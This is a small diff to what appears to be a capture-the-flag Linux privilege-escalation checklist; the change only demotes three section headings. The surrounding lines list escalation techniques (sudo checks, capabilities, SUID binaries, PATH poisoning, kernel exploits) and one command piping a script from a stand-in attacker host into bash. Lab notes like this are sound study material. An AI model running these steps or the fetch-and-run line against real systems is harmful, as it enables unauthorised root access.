@@ -6,7 +6,7 @@
 
 ---
 
-# Foothold
+## Foothold
 
 - [ ] We have the password for the current user
   - [ ] `sudo -n -l` -- -n means non interactive
@@ -65,7 +65,7 @@
   - [ ] `capsh --print` — dangerous caps like `CAP_SYS_ADMIN`?
 - [ ] Run LinEnum `curl http://$ATTACKER_IP:80/linenum.sh | bash`
 
-# Root Access
+## Root Access
 
 - [ ] Do we actually need root to get flag? /root/root.txt
 - [ ] sudo -l again as new user
@@ -76,7 +76,7 @@
 - [ ] Custom SUID binary not on GTFOBins? → strings, ltrace, strace
 - [ ] Kernel exploit as last resort uname -a → searchsploit
 
-# Jail Breakout
+## Jail Breakout
 
 - [ ] Missing full path in sudo/cron entry? → PATH poisoning
 - [ ] Native debug/shell command? (GTFO bins)
